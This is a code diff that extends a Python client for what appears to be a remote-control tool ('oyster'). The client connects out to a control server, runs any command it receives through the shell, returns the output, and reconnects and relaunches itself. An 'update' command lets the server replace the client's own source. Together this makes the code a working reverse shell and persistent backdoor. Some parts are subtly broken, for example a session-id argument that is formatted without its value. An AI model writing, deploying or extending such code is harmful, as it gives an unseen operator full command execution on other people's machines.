@@ -1,17 +1,22 @@
 import os
+from os import execv
 import socket
 import subprocess
 import sys
-from os.path import expanduser
+from os.path import expanduser, realpath
 from time import sleep
 
 
+# Proof
 class Client(object):
-    def __init__(self, host='', port=6667, recv_size=1024):
+    def __init__(self, host='', port=6667, recv_size=1024, server_shutdown=False, session_id='', shutdown_kill=False):
         self.host = host
         self.port = port
         self.recv_size = recv_size
-        self.connected = False
+        self.server_shutdown = server_shutdown
+        self.shutdown_kill = shutdown_kill
+        self.session_id = session_id
+        self.reconnect_to_session = True
         self.sock = self._connect_to_server()
 
     def _connect_to_server(self):
@@ -29,7 +34,6 @@ class Client(object):
             self.sock = socket.socket()
             try:
                 self.sock.connect((self.host, self.port))
-                self.connected = True
                 print('Connected to server...')
                 break
             except socket.error as the_error_message:
@@ -47,61 +51,194 @@ class Client(object):
         :return:
         """
 
-        self.sock.send(str.encode(some_data + str(os.getcwd()) + '>' + '~!_TERM_%~'))
+        self.sock.send(str.encode(some_data + str(os.getcwd()) + '> ' + '~!_TERM_$~'))
+        return self
+
+    def send_data(self, some_data, echo=True):
+        """
+        Send data to the server with the termination string appended.
+
+        :param some_data:
+        :param echo:
+        :return:
+        """
+        if echo:
+            print('Sending Data:', some_data)
+        self.sock.send(str.encode(some_data + '~!_TERM_$~'))
+        return self
+
+    def receive_data(self, echo=False):
+        """
+        Receive data from the server until we get the termination string.
+
+        :param echo:
+        :return:
+        """
+
+        # Try to receive data.
+        accepting = True
+        total_data = ''
+        print('Receiving data...')
+        while accepting:
+            try:
+                data = self.sock.recv(self.recv_size)
+            except socket.error as error_message:
+                print('Server closed connection:', error_message)
+                self.sock.close()
+                self.sock = self._connect_to_server()
+                continue
+
+            # Continue looping if there is no data.
+            if len(data) < 1:
+                print('Zero data received...')
+                self.sock.close()
+                self.sock = self._connect_to_server()
+                continue
+
+            # Decode from bytes.
+            d = data.decode('utf-8')
+            total_data += d
+            if echo:
+                print('Data:', d)
+
+            # Check for termination string.
+            if total_data[-10:] == '~!_TERM_$~':
+                accepting = False
+        print('Data received: {}'.format(total_data[:-10]))
+
+        # Chop off the termination string from the total data and assign it to data.
+        # Data should now be a string as well.
+        data = total_data[:-10]
+        return data
+
+    def set_session_id(self, session_id):
+        """
+        Set the session id for the client.
+
+        :param session_id:
+        :return:
+        """
+
+        self.session_id = session_id
+        return self
+
+    def reboot_self(self):
+        restart_command = [
+            '',
+            realpath(__file__),
+            'port={}'.format(self.port),
+            'host={}'.format(self.host),
+            'recv_size={}'.format(self.recv_size),
+            'server_shutdown={}'.format(self.server_shutdown),
+            'session_id='.format(self.session_id)
+        ]
+        execv(sys.executable, restart_command)
+        sys.exit()
+
+    def negotiate_server_shutdown(self):
+        if self.server_shutdown:
+            self.send_data('Y')
+            self.sock.close()
+            if self.shutdown_kill:
+                sys.exit()
+            self.reboot_self()
+        else:
+            self.send_data('N')
+        return self
+
+    def handle_disconnect(self):
+        print('Disconnecting...')
+        # Handle a disconnect command.
+        self.send_data('confirmed')
+        self.sock.close()
+        print('Sleeping for 30 seconds...')
+        sleep(30)
+        self._connect_to_server()
         return self
 
     def main(self):
+        """
+        Start receiving commands.
+
+        :return:
+        """
+
         # If we have a socket, then proceed to receive commands.
         if self.sock:
             while True:
-                # Try to receive data.
-                try:
-                    data = self.sock.recv(self.recv_size)
-                except socket.error as error_message:
-                    print('Server closed connection:', error_message)
-                    self.sock.close()
-                    self.sock = self._connect_to_server()
-                    continue
+                data = self.receive_data()
 
-                # Continue looping if there is no data.
-                if len(data) < 1:
-                    continue
-
-                # Check for single_command commands.  This block handles server/client exchanges
-                # when the initial connection is made, or the server needs to get the current
-                # wroking directory.
-                if data.decode('utf-8')[:15] == 'single_command-':
-                    d = data.decode('utf-8')[15:]
-                    # Get the OS name.
-                    if d == 'get_platform':
-                        self.sock.send(str.encode(sys.platform + '~!_TERM_%~'))
+                if len(data) < 500:
+                    # Set the session id.
+                    if data[14:] == 'set-session-id':
+                        self.set_session_id(data.split(' ')[1])
                         continue
-                    elif d == 'getcwd':
+
+                    if data == 'oyster getcwd':
                         self._send_output_with_cwd('')
                         continue
 
-                if data.decode('utf-8') == 'shutdown':
-                    self.sock.send(str.encode('~!_TERM_%~'))
-                    self.sock.close()
-                    sleep(30)
-                    continue
+                    # Check to see if the client should send the
+                    # server shutdown confirmation.
+                    if data == 'server_shutdown?':
+                        self.negotiate_server_shutdown()
+                        continue
 
-                # Handle quit events sent from the server.
-                if data.decode('utf-8') == 'quit':
-                    self.sock.send(str.encode('~!_TERM_%~'))
-                    # The control server is shutting down, so we should shutdown
-                    # then start trying to reconnect for the next session.
-                    self.sock.close()
-                    print('Control server disconnected...')
-                    print('Waiting for server...')
-                    sleep(30)
-                    self.sock = self._connect_to_server()
+                    if data[:7] == 'connect':
+                        try:
+                            uuid = data.split(' ')[1]
+                        except IndexError:
+                            print('No sesssion-id provided.')
+                            self.send_data('False')
+                            continue
+
+                        if uuid == self.session_id:
+                            if self.reconnect_to_session:
+                                print('Connecting to session.')
+                                self.send_data('True')
+                                self.session_id = uuid
+                                continue
+                            print('Will not connect to current session')
+                            self.send_data('False')
+                            continue
+                        else:
+                            self.send_data('True')
+                            self.session_id = uuid
+                        continue
+
+                    if data == 'disconnect':
+                        self.handle_disconnect()
+                        continue
+
+                    # Break the loop.
+                    if data == 'break':
+                        self._send_output_with_cwd('')
+                        break
+
+                    # Reboot self.
+                    if data == 'oyster reboot':
+                        self.send_data('confirmed')
+                        self.sock.close()
+                        break
+
+                    # Handle quit events sent from the server.
+                    if data == 'quit':
+                        self.send_data('confirmed')
+                        sleep(1)
+                        continue
+
+                # Update the client.py file(this file here).
+                if data[:7] == 'update ':
+                    with open('client.py', 'w') as f:
+                        f.write(data[7:])
+                        f.close()
+                    self._send_output_with_cwd('Client updated...\n')
                     continue
 
                 # Handle the cd command.
-                if data[:2].decode('utf-8') == 'cd':
+                if data[:2] == 'cd':
                     try:
-                        _dir = data[3:].decode('utf-8')
+                        _dir = data[3:]
 
                         # Cross platform cd to ~/
                         if _dir[:2] == '~/':
@@ -125,7 +262,7 @@ class Client(object):
 
                 # Process the command.
                 cmd = subprocess.Popen(
-                    data[:].decode('utf-8'),
+                    data[:],
                     shell=True,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
@@ -136,6 +273,7 @@ class Client(object):
                 output_bytes = cmd.stdout.read() + cmd.stderr.read()
                 output_str = str(output_bytes, 'utf-8')
 
+                print('Output Str: {}'.format(output_str))
                 # Send the output back to control server.
                 self._send_output_with_cwd(output_str)
 
@@ -144,11 +282,15 @@ if __name__ == '__main__':
     the_host = ''
     the_port = 6667
     the_recv_size = 1024
+    the_server_shutdown = False
+    the_session_id = ''
 
     def check_cli_arg(arg):
         global the_host
         global the_port
         global the_recv_size
+        global the_server_shutdown
+        global the_session_id
 
         if 'host=' in arg:
             the_host = arg.split('=')[1]
@@ -156,6 +298,12 @@ if __name__ == '__main__':
             the_port = int(arg.split('=')[1])
         elif 'recv_size=' in arg:
             the_recv_size = int(arg.split('=')[1])
+        elif 'server_shutdown=' in arg:
+            the_server_shutdown = True if arg.split('=')[1].upper() == 'Y' else False
+        elif 'session_id=' in arg:
+            the_session_id = arg.split('=')[1].strip()
+
+    restart_command = list(sys.argv)
 
     for argument in sys.argv[1:]:
         check_cli_arg(argument)
@@ -164,6 +312,12 @@ if __name__ == '__main__':
     client = Client(
         host=the_host,
         port=the_port,
-        recv_size=the_recv_size
+        recv_size=the_recv_size,
+        server_shutdown=the_server_shutdown,
+        session_id=the_session_id
     )
     client.main()
+
+    restart_command.insert(0, '')
+    execv(sys.executable, restart_command)
+    sys.exit()
